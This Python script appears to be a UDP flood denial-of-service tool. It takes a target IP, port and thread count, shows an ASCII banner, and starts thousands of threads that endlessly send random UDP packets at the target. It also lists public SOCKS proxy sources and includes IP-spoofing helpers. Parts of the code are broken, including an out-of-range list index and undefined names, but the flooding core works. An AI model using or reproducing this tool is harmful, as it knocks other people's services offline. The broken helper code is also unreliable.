import os, sys, time, socket, random, threading, getpass

sys.stdout.write("\x1b]2;Exo9999. | Devices: [1] | Running Attacks [1] | Server Units [8] | Clients: [18]\x07")

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])

proxys = open('proxies.txt').readlines()
bots = len(proxys)

os.system('cls' if os.name == 'nt' else 'clear')
print(f"""
\033[95m           

 ██▀███   █    ██   ██████ ▓█████▄  ██▓
▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▒██▀ ██▌▓██▒
▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ░██   █▌▒██▒
▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░▓█▄   ▌░██░
░██▓ ▒██▒▒▒█████▓ ▒██████▒▒░▒████▓ ░██░
░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ ░▓  
  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░ ░ ▒  ▒  ▒ ░
  ░░   ░  ░░░ ░ ░ ░  ░  ░   ░ ░  ░  ▒ ░
   ░        ░           ░     ░     ░  
                            ░
                             ╔══════════════════════════╦═══════════════════════╗
\033[95m                IP : [\033[95m{ip}\033[95m]
\033[95m                PORT : [\033[95m{port}\033[95m]
\033[95m                TIMES : [\033[95m{times}\033[95m]
\033[95m                THREADS : [\033[95m{threads}\033[95m]
\033[95m           METHODS : [\033[92mRusdi Ngawi\033[95m]
\033[95 ╚═╦═══════════════════════╦╩╦════════════════════╦═╝
""")

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  randip5 = random.randint(1,255)
  randip6 = random.randint(1,255)
  randip7 = random.randint(1,255)
  randip8 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  randip.append(randip5)
  randip.append(randip6)
  randip.append(randip7)
  randip.append(randip8)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

def proxyask():
    global urlproxy
    pro = input(f'[~] Get New List {nprox} [Y] : ')
    if pro == "Y":
        urlproxy = ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all")
        urlproxy = ("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5")
        getproxy()
        askthreads()
    else:
        proxyask()  

def run():
	data = random._urandom(811)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run2():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run3():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run4():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run5():
	data = random._urandom(811)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run6():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run7():
	data = random._urandom(1800)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run8():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run9():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run10():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run11():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run12():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run13():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run14():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run15():
	data = random._urandom(1800)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run16():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run17():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run18():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run19():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

def run20():
	data = random._urandom(615)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(200):
				s.sendto(data,addr)
		except:
			s.close()

for _x in range(200):
	threading.Thread(target=run).start()
	threading.Thread(target=run2).start()
	threading.Thread(target=run3).start()
	threading.Thread(target=run4).start()
	threading.Thread(target=run5).start()
	threading.Thread(target=run6).start()
	threading.Thread(target=run7).start()
	threading.Thread(target=run8).start()
	threading.Thread(target=run9).start()
	threading.Thread(target=run10).start()
	threading.Thread(target=run11).start()
	threading.Thread(target=run12).start()
	threading.Thread(target=run13).start()
	threading.Thread(target=run14).start()
	threading.Thread(target=run15).start()
	threading.Thread(target=run16).start()
	threading.Thread(target=run17).start()
	threading.Thread(target=run18).start()
	threading.Thread(target=run19).start()
	threading.Thread(target=run20).start()